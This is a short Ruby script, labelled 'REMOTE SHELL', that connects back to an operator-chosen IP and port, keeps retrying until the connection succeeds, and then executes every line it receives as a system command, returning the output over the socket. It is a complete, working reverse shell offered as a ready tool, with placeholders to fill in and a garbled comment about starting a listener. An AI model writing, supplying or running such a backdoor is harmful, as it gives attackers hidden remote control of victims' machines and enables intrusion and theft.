
#REMOTE SHELL

#External libraries and modules("Ruby Gems")
require 'socket'
require 'open3'

#Variables

RHOST = "you'r_ip"
RPORT = "you'r_port"

#Connection attempts and Handling Ruby Exceptions

begin
	s = TCPSocket.new "#{RHOST}","#{RPORT}"
	s.puts "----Successful Connection----"
rescue
	sleep 15
	retry
end

#Command line(Reverse Shell) 

begin
	while line = s.gets
		Open3.popen2e("#{line}") do | stdin, stdout_and_stderr | 
			IO.copy_stream(stdout_and_stderr, s)
		end
	end
rescue
	retry
end

#Start a server 
#ruby /run /e httpd./p "port_without_quotes"




